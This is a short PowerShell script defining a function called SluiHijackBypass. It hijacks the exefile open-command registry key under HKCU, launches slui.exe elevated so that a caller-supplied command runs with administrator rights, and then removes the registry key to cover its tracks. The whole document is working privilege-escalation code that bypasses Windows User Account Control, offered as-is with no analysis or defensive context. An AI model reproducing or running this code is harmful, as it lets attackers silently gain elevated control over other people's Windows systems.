function SluiHijackBypass(){
	Param (

		[Parameter(Mandatory=$True)]
		[String]$command,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)

	#Create registry structure
	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force

	#Perform the bypass
  if ([Environment]::Is64BitProcess)
    {
			#x64 shell in Windows x64 | x86 shell in Windows x86
			Start-Process "C:\Windows\System32\slui.exe" -Verb runas
		}
		else
		{
			#x86 shell in Windows x64
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
		}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
}
